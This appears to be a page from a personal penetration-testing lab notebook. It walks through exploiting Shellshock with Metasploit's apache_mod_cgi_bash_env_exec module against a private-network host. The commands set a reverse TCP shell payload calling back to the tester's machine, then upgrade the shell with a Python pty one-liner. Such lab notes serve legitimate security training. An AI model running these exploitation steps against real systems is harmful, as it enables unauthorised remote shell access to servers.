<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>4.1 Metasploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">4.1 Metasploit</h1><br/><br />1. Run “metasploit” and look for this vulnerability.<br /><br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$msfconsole</span><br />msf6&nbsp;&gt;&nbsp;search&nbsp;shellshock<br /></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/698-1.png" alt="images/698-1.png" /><br /><br />2. Use the (multi/http/apache_mod_cgi_bash_env_exec)<strong> </strong> exploit.<br /><br />    <div class="codebox"><div class="codebox">msf6&nbsp;&gt;&nbsp;use&nbsp;1<br />msf6&nbsp;exploit<span style="color:#a52a2a;font-weight:700">(</span>multi<span style="color:#a52a2a;font-weight:700">/</span>http<span style="color:#a52a2a;font-weight:700">/</span>apache_mod_cgi_bash_env_exec<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;&gt;&nbsp;<span style="color:#a52a2a;font-weight:700">set</span>&nbsp;RHOST&nbsp;192.168.12.35<br />msf6&nbsp;exploit<span style="color:#a52a2a;font-weight:700">(</span>multi<span style="color:#a52a2a;font-weight:700">/</span>http<span style="color:#a52a2a;font-weight:700">/</span>apache_mod_cgi_bash_env_exec<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;&gt;&nbsp;<span style="color:#a52a2a;font-weight:700">set</span>&nbsp;LHOST&nbsp;192.168.12.10<br />msf6&nbsp;exploit<span style="color:#a52a2a;font-weight:700">(</span>multi<span style="color:#a52a2a;font-weight:700">/</span>http<span style="color:#a52a2a;font-weight:700">/</span>apache_mod_cgi_bash_env_exec<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;&gt;&nbsp;<span style="color:#a52a2a;font-weight:700">set</span>&nbsp;targeturi&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>cgi-bin<span style="color:#a52a2a;font-weight:700">/</span>shell.sh<br />msf6&nbsp;exploit<span style="color:#a52a2a;font-weight:700">(</span>multi<span style="color:#a52a2a;font-weight:700">/</span>http<span style="color:#a52a2a;font-weight:700">/</span>apache_mod_cgi_bash_env_exec<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;&gt;&nbsp;<span style="color:#a52a2a;font-weight:700">set</span>&nbsp;payload&nbsp;linux<span style="color:#a52a2a;font-weight:700">/</span>x86<span style="color:#a52a2a;font-weight:700">/</span>shell<span style="color:#a52a2a;font-weight:700">/</span>reverse_tcp<br />msf6&nbsp;exploit<span style="color:#a52a2a;font-weight:700">(</span>multi<span style="color:#a52a2a;font-weight:700">/</span>http<span style="color:#a52a2a;font-weight:700">/</span>apache_mod_cgi_bash_env_exec<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;&gt;&nbsp;exploit&nbsp;<br /></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/698-2.png" alt="images/698-2.png" /><br /><br />    You got a "meterpreter".<br /><br />3. Upgrade to an Intelligent Shell<br />    <div class="codebox"><div class="codebox">python&nbsp;-c&nbsp;<span style="color:#ff00ff;font-weight:400">'import&nbsp;pty;pty.spawn("/bin/bash")'</span></div></div><br /><br />    <span style="color:#ffa500;">Output:</span><br />    <img src="images/698-3.png" alt="images/698-3.png" /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>